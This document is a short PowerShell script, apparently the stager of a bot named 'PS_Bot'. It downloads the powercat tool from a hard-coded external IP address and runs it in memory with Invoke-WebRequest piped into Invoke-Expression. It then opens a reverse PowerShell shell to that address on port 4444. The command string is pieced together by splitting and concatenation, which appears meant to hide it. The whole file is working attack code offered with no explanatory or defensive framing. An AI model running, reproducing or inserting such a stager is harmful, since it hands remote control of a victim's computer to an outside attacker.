$condicon = $true
$ip = "35.165.190.126"
$ipHTTP="35.165.190.126:80"
$port = "4444"
$command = "powercat|-c ";$command+=$ip;$command+=" -p ";$command+=$port;$command+=" -ep"
$command = $command.split("|")    
$uri="http://"
$uri+=$ipHTTP;$uri+="/PS_Bot/";
$uri+=$command[0];
$uri+=".txt"
$uri
Invoke-WebRequest $uri -usebasicparsing | Invoke-Expression
$comando = $command[0];$comando += " ";$comando+=$command[1]
$comando | Invoke-Expression